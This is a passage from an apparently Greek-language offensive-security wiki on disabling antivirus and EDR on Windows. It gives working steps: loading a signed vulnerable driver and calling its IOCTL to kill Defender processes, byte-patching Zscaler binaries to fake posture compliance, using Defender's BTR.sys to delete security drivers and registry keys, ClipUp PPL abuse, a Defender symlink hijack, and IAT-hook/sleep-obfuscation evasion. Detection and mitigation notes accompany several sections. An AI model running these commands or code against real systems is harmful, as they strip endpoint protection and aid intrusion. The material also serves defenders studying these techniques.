1. **Υπογεγραμμένος driver**: Το αρχείο που παραδίδεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή της Microsoft, φορτώνεται ακόμη και όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Εγκατάσταση service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρίζει τον driver ως **kernel service** και η δεύτερη τον εκκινεί, ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
3. **IOCTLs που εκτίθενται από τον driver**
| Κωδικός IOCTL | Δυνατότητα                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματισμός αυθαίρετης διεργασίας βάσει PID (χρησιμοποιείται για τον τερματισμό υπηρεσιών Defender/EDR) |
| `0x990000D0` | Διαγραφή αυθαίρετου αρχείου στον δίσκο |
| `0x990001D0` | Unload του driver και αφαίρεση του service |

Ελάχιστο C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις user-mode protections· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *protected* processes, να τις τερματίσει ή να παραποιήσει kernel objects, ανεξάρτητα από τα PPL/PP, ELAM ή άλλες hardening features.

Ανίχνευση / Mitigation
•  Ενεργοποιήστε τη vulnerable-driver block list της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται να φορτώσουν το `AToolsKrnl64.sys`.
•  Παρακολουθείτε τη δημιουργία νέων *kernel* services και δημιουργήστε alert όταν ένας driver φορτώνεται από world-writable directory ή δεν υπάρχει στη allow-list.
•  Παρακολουθείτε user-mode handles προς custom device objects, τα οποία ακολουθούνται από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των Posture Checks του Zscaler Client Connector μέσω Patching Binary στον Δίσκο

Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες device-posture και βασίζεται στα Windows RPC για την επικοινωνία των αποτελεσμάτων με άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση του posture πραγματοποιείται **εξ ολοκλήρου στην πλευρά του client** (μια boolean τιμή αποστέλλεται στον server).
2. Τα εσωτερικά RPC endpoints επικυρώνουν μόνο ότι το executable που συνδέεται είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με το **patching τεσσάρων υπογεγραμμένων binaries στον δίσκο**, και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, ώστε κάθε check να είναι compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε, ακόμη και unsigned, διεργασία μπορεί να συνδεθεί στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Ελάχιστο απόσπασμα patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλοι** οι έλεγχοι posture εμφανίζονται **πράσινοι/συμμορφωμένοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Το compromised host αποκτά unrestricted πρόσβαση στο internal network που ορίζεται από τις Zscaler policies.

Αυτή η μελέτη περίπτωσης δείχνει πώς οι αποφάσεις trust που λαμβάνονται αποκλειστικά στην πλευρά του client και οι απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με λίγα byte patches.

## Κατάχρηση trusted functionality του Microsoft Defender `BTR.sys`

Ο driver **Boot-Time Removal** του Defender αποτελεί χρήσιμο αντιπαράδειγμα στο κλασικό BYOVD. Το `BTR.sys` είναι ένα νόμιμο Microsoft-signed remediation component χωρίς bug memory corruption και χωρίς IOCTL interface· αφού αποκτήσει administrator access και `SeLoadDriverPrivilege`, ένας operator μπορεί, αντί γι' αυτό, να πλαστογραφήσει την private remediation transaction του και να αποκτήσει τις προβλεπόμενες λειτουργίες αρχείων/registry στο Ring-0. Πρόκειται για **post-compromise AV/EDR-neutralization primitive και όχι για initial access ή privilege escalation**, ενώ ο driver μπορεί να εξαχθεί από το ίδιο το `MpEngine.dll` του target, μέσω του `BOOTTIMETOOL` resource, αντί να εισαχθεί ένας conspicuous third-party driver.<sup>[[36]](#references)</sup>

### Προετοιμασία του one-shot driver

Το Defender συνήθως αποθηκεύει το resource ως ένα τυχαίο αρχείο `[a-z]{8}.sys` και καταχωρίζει μια kernel service με παρόμοιο όνομα. Το `DriverEntry` διαβάζει την τιμή `Args` της service, ανοίγει το αναφερόμενο NTFS ADS, αποκρυπτογραφεί και επικυρώνει τη λίστα ενεργειών, γράφει feedback και επιστρέφει `0xC0000056` (`STATUS_DELETE_PENDING`) μετά την επιτυχή εκτέλεση, ώστε ο driver να γίνει unload αντί να παραμείνει resident. Μια πλαστογραφημένη service έχει τις ακόλουθες χαρακτηριστικές τιμές.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
Το stream `:changelist` περιέχει ένα blob κρυπτογραφημένο με RC4. Τα builds που αναλύθηκαν επαναχρησιμοποιούν ένα σταθερό κλειδί 256 byte, επομένως η κρυπτογράφηση δεν αποτελεί boundary εξουσιοδότησης. Ένα έγκυρο plaintext έχει global header 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC και transaction ID που προκύπτει από το payload), ακολουθούμενο από μια UTF-16 διαδρομή feedback που τερματίζεται με null και οποιονδήποτε αριθμό items. Κάθε item έχει header 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) και action-specific data που τελειώνουν με **ακριβώς τέσσερα NUL bytes**. Κάθε περιοχή header/data ελέγχεται ανεξάρτητα με CRC-32 polynomial `0xEDB88320`, αρχική κατάσταση `0xFFFFFFFF` και **χωρίς τελικό XOR** (`~CRC32`). Η κατάσταση του CRC επαναφέρεται για κάθε περιοχή.<sup>[[36]](#references)[[37]](#references)</sup>

Τα αποδεκτά action IDs εκθέτουν αυτά τα kernel primitives.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | Result |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Διαγραφή αρχείου, συμπεριλαμβανομένου locked αρχείου |
| 2 | `[UTF-16 path]` | Αφαίρεση άδειου directory |
| 3 | `[Flags][source][destination]` | Μετακίνηση αρχείου σε protected path που επιλέγει ο attacker· κενό destination σημαίνει διαγραφή |
| 4 | `[Flags][key path]` | Αναδρομική διαγραφή registry key |
| 5 | `[Flags][key path + "\\" + value]` | Διαγραφή registry value |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Δημιουργία/ενημέρωση registry value και δημιουργία paths κλειδιών που λείπουν |

Για τα actions 5 και 6, ο on-wire διαχωριστής key/value είναι **δύο διαδοχικά backslashes**· ένα path σε συμβατική μορφή δεν θα διαχωριστεί σωστά. Το feedback file αντικατοπτρίζει σε μεγάλο βαθμό το request, αλλά τα πρώτα τέσσερα data bytes κάθε item μετατρέπονται στο resulting `NTSTATUS`. Για τα actions 1 και 2, τα οποία δεν διαθέτουν leading flags field, το BTR μετακινεί το path στα τέσσερα δεσμευμένα trailing bytes, ώστε να δημιουργήσει χώρο για αυτό το status.<sup>[[36]](#references)</sup>

### Workflow του `BTR_CLI` και παράθυρο early-boot

Το [`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) υλοποιεί ολόκληρη την αλυσίδα: εξάγει το `BTR.sys` από το local Defender, δημιουργεί τα `<random>.sys:changelist` και ένα feedback stream, κάνει serialize/checksum/encrypt chained actions, δημιουργεί απευθείας το service registry key και, στη συνέχεια, καλεί το `NtLoadDriver` για το `-trigger now` ή αφήνει το driver ως system-start driver για το `-trigger boot`. Το direct registry staging παρακάμπτει το κανονικό SCM `CreateServiceW` path και επομένως **δεν** παράγει service-install Event ID 7045. Τα artifacts που ενεργοποιούνται κατά το boot μπορούν αργότερα να αφαιρεθούν με `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
Το `Start=0` δεν είναι usable επειδή το BTR εκτελεί file I/O από το `DriverEntry` πριν το storage stack και το link `SystemRoot` είναι έτοιμα. Το `Start=1` μαζί με την ομάδα υψηλής προτεραιότητας `Boot Bus Extender` εκτελείται αντίθετα στη Phase 1: το NTFS είναι usable, αλλά πολλά system-start security drivers και user-mode EDR services δεν έχουν αρχικοποιηθεί. Boot-start filters όπως το `WdFilter` μπορεί να έχουν ήδη φορτωθεί, όμως το BTR μπορεί να αφαιρέσει τα binaries ή το service configuration τους πριν από την επόμενη εκκίνηση και μπορεί να διαγράψει τα service executables πριν τα εκκινήσει το SCM. Το ELAM δεν κλείνει αυτό το κενό, επειδή το BTR εκτελείται μετά το boot-start evaluation και διαθέτει έγκυρη Microsoft signature.<sup>[[36]](#references)</sup>

Πολλαπλές ενέργειες εκτελούνται σε ένα transaction. Το PoC προσθέτει ως πρώτο το Action 1 για το hard-coded `\SystemRoot\Temp\BootClean.log`: το BTR δημιουργεί αυτό το log, στη συνέχεια καταναλώνει το δικό του delete request και το αφαιρεί πριν κάνει unload. Αυτό μειώνει τα evidence, ενώ η τοποθέτηση feedback στο `<random>.sys:<random>.dat` επιτρέπει την αφαίρεση του driver και των δύο streams μαζί.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlations ανίχνευσης υψηλού σήματος

Οι rules που βασίζονται μόνο σε signatures και το Microsoft vulnerable-driver blocklist δεν αντιμετωπίζουν την κατάχρηση της προβλεπόμενης λειτουργικότητας του BTR. Προτιμήστε τα παρακάτω behavioral correlations, διακρίνοντας παράλληλα τη legitimate Defender lineage από έναν arbitrary launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Η δημιουργία του `.sys:changelist` είναι καθολική στο BTR staging. Ένα `.dat` ADS συνδεδεμένο στο ίδιο `.sys` είναι ιδιαίτερα ύποπτο, επειδή το legitimate Defender τοποθετεί κανονικά το feedback κάτω από το `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 χωρίς System 7045:** Συσχετίστε την άμεση δημιουργία του `HKLM\SYSTEM\CurrentControlSet\Services\<random>` που περιέχει `Args=...:changelist` και `Group=Boot Bus Extender` με την απουσία αντίστοιχου SCM installation event.
- **Sysmon 6 -> 23:** Συσχετίστε ένα γνωστό BTR driver load από non-Defender lineage με επακόλουθη file deletion που αποδίδεται στο `System`/PID 4, ιδιαίτερα για security binaries.
- **Sysmon 11 -> 23:** Δημιουργήστε alert για την ταχεία δημιουργία και διαγραφή του `\SystemRoot\Temp\BootClean.log` από το `System`/PID 4.
- Περιορίστε και ελέγξτε την assignment/enabling του `SeLoadDriverPrivilege`. Μια Microsoft signature από μόνη της δεν επαρκεί ως trust όταν ένας security-tool driver γίνεται staging από `cmd.exe`, PowerShell ή άγνωστη διεργασία.

## Κατάχρηση του Protected Process Light (PPL) για Tamper AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια signer/level hierarchy, ώστε μόνο protected processes ίδιου ή υψηλότερου επιπέδου να μπορούν να κάνουν tamper μεταξύ τους. Σε offensive σενάρια, αν μπορείτε να εκκινήσετε νόμιμα ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε benign functionality (π.χ. logging) σε ένα constrained, PPL-backed write primitive εναντίον protected directories που χρησιμοποιούνται από AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι κάνει μια διεργασία να εκτελείται ως PPL
- Το target EXE (και κάθε loaded DLL) πρέπει να είναι signed με PPL-capable EKU.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί compatible protection level που να ταιριάζει με τον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα levels θα αποτύχουν κατά τη δημιουργία.

Δείτε επίσης μια ευρύτερη εισαγωγή στα PP/PPL και στην LSASS protection εδώ:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (επιλέγει protection level και προωθεί arguments στο target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο system binary `C:\Windows\System32\ClipUp.exe` κάνει self-spawn και δέχεται μια παράμετρο για την εγγραφή ενός log file σε διαδρομή που καθορίζεται από τον caller.
- Όταν εκκινείται ως PPL process, η εγγραφή του file πραγματοποιείται με PPL backing.
- Το ClipUp δεν μπορεί να κάνει parse σε paths που περιέχουν spaces· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά προστατευμένες τοποθεσίες.

8.3 short path helpers
- List short names: `dir /x` σε κάθε parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
2) Περάστε στο ClipUp το log-path argument για να εξαναγκάσετε τη δημιουργία ενός file σε προστατευμένο AV directory (π.χ. Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
3) Αν το target binary είναι συνήθως ανοιχτό/κλειδωμένο από το AV κατά την εκτέλεσή του (π.χ. MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση, πριν ξεκινήσει το AV, εγκαθιστώντας ένα auto-start service που εκτελείται αξιόπιστα νωρίτερα. Επικυρώστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
4) Κατά την επανεκκίνηση, η εγγραφή με PPL backing πραγματοποιείται πριν το AV κλειδώσει τα binaries του, προκαλώντας corruption στο target file και αποτρέποντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε το περιεχόμενο που γράφει το ClipUp, πέρα από τη θέση του· το primitive είναι κατάλληλο για corruption και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται local admin/SYSTEM για την εγκατάσταση/εκκίνηση ενός service και ένα reboot window.
- Ο χρονισμός είναι κρίσιμος: το target δεν πρέπει να είναι ανοιχτό· η εκτέλεση κατά το boot αποφεύγει τα file locks.

Detections
- Δημιουργία process του `ClipUp.exe` με ασυνήθιστα arguments, ειδικά όταν έχει parent non-standard launchers, κοντά στο boot.
- Νέα services ρυθμισμένα για auto-start ύποπτων binaries και τα οποία ξεκινούν σταθερά πριν από το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση service πριν από failures στην εκκίνηση του Defender.
- File integrity monitoring σε Defender binaries/Platform directories· αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από processes με protected-process flags.
- ETW/EDR telemetry: αναζητήστε processes που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και anomalous χρήση επιπέδων PPL από non-AV binaries.

Mitigations
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να εκτελούνται ως PPL και από ποιους parents· αποκλείστε την invocation του ClipUp εκτός legitimate contexts.
- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start services και παρακολουθείτε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιωθείτε ότι τα Defender tamper protection και early-launch protections είναι ενεργοποιημένα· ερευνήστε startup errors που υποδεικνύουν binary corruption.
- Εξετάστε την απενεργοποίηση της δημιουργίας 8.3 short-name σε volumes που φιλοξενούν security tooling, εφόσον είναι συμβατό με το περιβάλλον σας (κάντε thorough testing).

## Παραποίηση του Microsoft Defender μέσω Symlink Hijack του Platform Version Folder

Το Windows Defender επιλέγει την platform από την οποία εκτελείται, απαριθμώντας τα subfolders κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει το subfolder με το υψηλότερο lexicographic version string (π.χ. `4.18.25070.5-0`) και, στη συνέχεια, ξεκινά τα Defender service processes από εκεί (ενημερώνοντας αντίστοιχα τα service/registry paths). Αυτή η επιλογή εμπιστεύεται directory entries, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε attacker-writable path και να επιτύχει DLL sideloading ή service disruption.<sup>[[21]](#references)[[22]](#references)</sup>

Προαπαιτούμενα
- Local Administrator (απαιτείται για τη δημιουργία directories/symlinks κάτω από το Platform folder)
- Δυνατότητα για reboot ή trigger του Defender platform re-selection (service restart κατά το boot)
- Απαιτούνται μόνο built-in tools (`mklink`)

Γιατί λειτουργεί
- Το Defender αποκλείει writes στους δικούς του φακέλους, αλλά η επιλογή platform εμπιστεύεται τα directory entries και επιλέγει το lexicographically υψηλότερο version χωρίς να επικυρώνει ότι το target επιλύεται σε protected/trusted path.

Βήμα προς βήμα (παράδειγμα)
1) Προετοιμάστε ένα writable clone του τρέχοντος platform folder, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε ένα directory symlink υψηλότερης έκδοσης μέσα στο Platform που να δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από τη redirected διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη διαδρομή της νέας διεργασίας κάτω από το `C:\TMP\AV\` και τη διαμόρφωση της υπηρεσίας/το registry να αντικατοπτρίζουν αυτήν την τοποθεσία.

Επιλογές μετά το exploitation
- DLL sideloading/code execution: Αποθέστε/αντικαταστήστε DLLs που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Τερματισμός/άρνηση υπηρεσίας: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να αποτύχει να εκκινηθεί:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημειώστε ότι αυτή η technique δεν παρέχει privilege escalation από μόνη της· απαιτεί δικαιώματα admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι Red teams μπορούν να μεταφέρουν το runtime evasion έξω από το C2 implant και μέσα στο ίδιο το target module, κάνοντας hooking στο Import Address Table (IAT) και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position-independent code (PIC). Αυτό γενικεύει το evasion πέρα από το μικρό API surface που εκθέτουν πολλά kits (π.χ., CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Κάντε stage ένα PIC blob δίπλα στο target module χρησιμοποιώντας reflective loader (prepended ή companion). Το PIC πρέπει να είναι self-contained και position-independent.
- Κατά τη φόρτωση του host DLL, διατρέξτε το IMAGE_IMPORT_DESCRIPTOR και κάντε patch τις IAT entries για τα στοχευμένα imports (π.χ., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε thin PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν από το tail-calling του πραγματικού API address. Τυπικά evasions περιλαμβάνουν:
- Memory mask/unmask γύρω από την κλήση (π.χ., encrypt beacon regions, RWX→RX, αλλαγή page names/permissions) και, στη συνέχεια, restore μετά την κλήση.
- Call-stack spoofing: δημιουργήστε ένα benign stack και κάντε transition στο target API, ώστε η ανάλυση του call stack να επιλύεται στα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για compatibility, κάντε export ένα interface, ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να καταχωρίζει ποια APIs θα γίνονται hook για Beacon, BOFs και post-ex DLLs.

Γιατί IAT hooking εδώ
- Λειτουργεί για οποιονδήποτε κώδικα χρησιμοποιεί το hooked import, χωρίς τροποποίηση του tool code ή εξάρτηση από το Beacon για proxy συγκεκριμένων APIs.
- Καλύπτει post-ex DLLs: το hooking των LoadLibrary* σάς επιτρέπει να κάνετε intercept τα module loads (π.χ., System.Management.Automation.dll, clr.dll) και να εφαρμόζετε το ίδιο masking/stack evasion στα API calls τους.
- Αποκαθιστά την αξιόπιστη χρήση post-ex commands που κάνουν process spawning απέναντι σε detections βασισμένα στο call stack, κάνοντας wrapping τα CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφάρμοσε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr επιδεικνύουν hooking κατά τη διάρκεια του DllMain του loaded module.
- Κράτησε τα wrappers μικρά και PIC-safe· κάνε resolve το true API μέσω της αρχικής τιμής IAT που κατέγραψες πριν από το patching ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποίησε μεταβάσεις RW → RX για PIC και απόφυγε να αφήνεις writable+executable pages.

Call-stack spoofing stub
- PIC stubs τύπου Draugr δημιουργούν μια fake call chain (return addresses μέσα σε benign modules) και στη συνέχεια κάνουν pivot στο real API.
- Αυτό παρακάμπτει detections που αναμένουν canonical stacks από Beacon/BOFs προς sensitive APIs.
- Συνδύασέ το με stack cutting/stack stitching techniques ώστε να καταλήγεις μέσα στα expected frames πριν από το API prologue.

Operational integration
- Πρόσθεσε τον reflective loader πριν από τα post-ex DLLs, ώστε τα PIC και hooks να αρχικοποιούνται αυτόματα όταν φορτώνεται το DLL.
- Χρησιμοποίησε ένα Aggressor script για να καταχωρίζεις target APIs, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από το ίδιο evasion path χωρίς code changes.

Detection/DFIR considerations
- IAT integrity: entries που κάνουν resolve σε non-image (heap/anon) addresses· periodic verification των import pointers.
- Stack anomalies: return addresses που δεν ανήκουν σε loaded images· abrupt transitions σε non-image PIC· inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes στο IAT, early DllMain activity που τροποποιεί import thunks, unexpected RX regions που δημιουργούνται κατά το load.
- Image-load evasion: αν γίνεται hooking του LoadLibrary*, παρακολούθησε ύποπτα loads από automation/clr assemblies που συσχετίζονται με memory masking events.

Related building blocks and examples
- Reflective loaders που εκτελούν IAT patching κατά το load (π.χ. TitanLdr, AceLdr)
- Memory masking hooks (π.χ. simplehook) και stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (π.χ. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks μέσω ενός resident PICO

Αν ελέγχεις έναν reflective loader, μπορείς να κάνεις hook στα imports **κατά τη διάρκεια του** `ProcessImports()` αντικαθιστώντας τον pointer του loader προς το `GetProcAddress` με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιούργησε ένα **resident PICO** (persistent PIC object) που επιβιώνει αφού το transient loader PIC απελευθερώσει τη μνήμη του.
- Κάνε export μια συνάρτηση `setup_hooks()` που κάνει overwrite τον import resolver του loader (π.χ. `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, κάνε skip τα ordinal imports και χρησιμοποίησε ένα hash-based hook lookup όπως το `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επέστρεψέ το· διαφορετικά, κάνε delegate στο πραγματικό `GetProcAddress`.
- Καταχώρισε τα hook targets κατά το link time με entries Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει valid επειδή βρίσκεται μέσα στο resident PICO.

Αυτό παρέχει **import-time IAT redirection** χωρίς patching του code section του loaded DLL μετά το load.

### Εξαναγκασμός hookable imports όταν το target χρησιμοποιεί PEB-walking

Τα import-time hooks ενεργοποιούνται μόνο αν η function βρίσκεται πραγματικά στο IAT του target. Αν ένα module κάνει resolve τα APIs μέσω PEB-walk + hash (χωρίς import entry), εξανάγκασε ένα πραγματικό import ώστε το path του loader `ProcessImports()` να το δει:

- Αντικατάστησε το hashed export resolution (π.χ. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με direct reference όπως το `&WaitForSingleObject`.
- Ο compiler εκπέμπει ένα IAT entry, επιτρέποντας interception όταν ο reflective loader κάνει resolve τα imports.

### Ekko-style sleep/idle obfuscation χωρίς patching του `Sleep()`

Αντί να κάνεις patch το `Sleep`, κάνε hook τα **actual wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για long waits, τύλιξε την κλήση σε μια Ekko-style obfuscation chain που κρυπτογραφεί το in-memory image κατά το idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποίησε `CreateTimerQueueTimer` για να προγραμματίσεις μια sequence από callbacks που καλούν `NtContinue` με crafted `CONTEXT` frames.
- Typical chain (x64): κάνε το image `PAGE_READWRITE` → RC4 encrypt μέσω του `advapi32!SystemFunction032` σε ολόκληρο το mapped image → εκτέλεσε το blocking wait → RC4 decrypt → **restore τα per-section permissions** κάνοντας walk στα PE sections → signal completion.
- Το `RtlCaptureContext` παρέχει ένα template `CONTEXT`· κάνε clone σε πολλαπλά frames και όρισε τα registers (`Rip/Rcx/Rdx/R8/R9`) ώστε να καλούν κάθε step.

Operational detail: επέστρεφε “success” για long waits (π.χ. `WAIT_OBJECT_0`), ώστε ο caller να συνεχίζει ενώ το image είναι masked. Αυτό το pattern κρύβει το module από scanners κατά τα idle windows και αποφεύγει το κλασικό signature του “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Bursts από `CreateTimerQueueTimer` callbacks που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα contiguous buffers μεγέθους image.
- `VirtualProtect` σε μεγάλο range, ακολουθούμενο από custom per-section permission restoration.

### Runtime CFG registration για sleep-obfuscation gadgets

